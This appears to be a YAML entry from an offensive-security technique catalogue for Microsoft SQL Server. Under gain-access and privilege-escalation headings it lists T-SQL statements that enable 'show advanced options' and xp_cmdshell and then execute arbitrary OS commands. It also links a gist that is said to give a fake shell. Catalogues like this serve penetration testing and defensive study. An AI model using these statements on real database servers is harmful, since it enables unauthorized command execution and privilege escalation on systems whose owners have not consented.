---
functions:
  gain-access:
    - description: Enable command execution in Microsoft SQL Server
      code: |
        Enable command execution:
        EXEC sp_configure 'show advanced options',1;
        RECONFIGURE;
        exec SP_CONFIGURE 'xp_cmdshell',1;
        RECONFIGURE;
        EXEC xp_cmdshell [cmd]
  privilege-escalation:
    - description: Enable command execution in Microsoft SQL Server
      code: |
        # Same as gain access

resources : |
  https://gist.github.com/unkn0wnsyst3m/6bcfacc3699dbac67e2f080b00b7b77b   <-- this sript gives you a fake shell with command execution
---